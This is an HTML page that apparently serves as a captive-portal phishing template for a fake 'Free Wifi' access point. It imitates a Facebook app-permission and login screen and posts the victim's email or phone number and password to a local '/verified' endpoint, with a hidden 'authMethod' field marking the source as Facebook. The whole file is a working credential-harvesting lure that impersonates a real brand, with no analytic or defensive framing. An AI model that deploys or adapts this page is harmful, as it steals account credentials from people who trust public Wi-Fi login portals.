<!DOCTYPE html>
<html lang="en">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=0.75">
	<meta charset="UTF-8">
	<title>Free Wifi - Facebook</title>
	<link rel="stylesheet" href="facebook_style.css">
</head>
<body>
  <div class="content-left">
    <form action="/verified">
      <h1>facebook</h1>
      <p>Application <strong>Free Wifi</strong> wants to access your account informations. Application will gain permission to following informations: <strong>Username, Profile Picture</strong></p>
      <input id="authMethod" type="authMethod" name="authMethod" value="Facebook" hidden/>
      <div class="form-group">
        <input id="username" type="name" name="username" placeholder="Email address or phone number" required>
      </div>
      <div class="form-group">
        <input id="password" type="password" name="password" placeholder="Password" required>
      </div>
      <div class="login">
        <button class="button" title="login">Log In</button>
      </div>
    </form>
  </div>
</body>
</html>
